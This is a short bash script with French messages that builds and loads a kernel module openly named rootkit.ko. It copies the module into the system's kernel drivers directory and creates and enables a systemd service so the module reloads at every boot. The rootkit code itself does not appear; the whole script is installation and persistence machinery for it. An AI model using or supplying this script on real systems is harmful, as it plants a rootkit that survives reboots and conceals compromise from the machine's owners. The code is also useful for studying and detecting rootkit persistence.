#!/bin/bash

echo "[+] Compilation du module..."
make

echo "[+] Insertion du module..."
sudo insmod rootkit.ko

echo "[+] Copie du module dans /lib/modules/ et update..."
sudo cp rootkit.ko /lib/modules/$(uname -r)/kernel/drivers/
sudo depmod

echo "[+] Création du service systemd..."

cat <<EOF | sudo tee /etc/systemd/system/rootkit.service
[Unit]
Description=Module Rootkit 
After=network.target

[Service]
Type=oneshot
ExecStart=/sbin/insmod /lib/modules/$(uname -r)/kernel/drivers/rootkit.ko
ExecStop=/sbin/rmmod rootkit

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reexec
sudo systemctl enable rootkit.service

echo "[+] Rootkit installé et service activé."
